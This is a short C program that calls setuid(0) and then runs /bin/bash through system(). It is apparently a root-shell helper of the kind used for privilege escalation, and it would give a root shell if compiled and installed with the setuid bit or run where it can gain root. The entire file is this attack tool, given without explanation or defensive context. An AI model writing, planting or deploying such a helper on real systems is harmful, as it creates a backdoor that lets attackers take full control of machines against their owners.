#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>

int main(int argc, char* argv[]) {
    setuid(0);
    system("/bin/bash");
    return 0;
}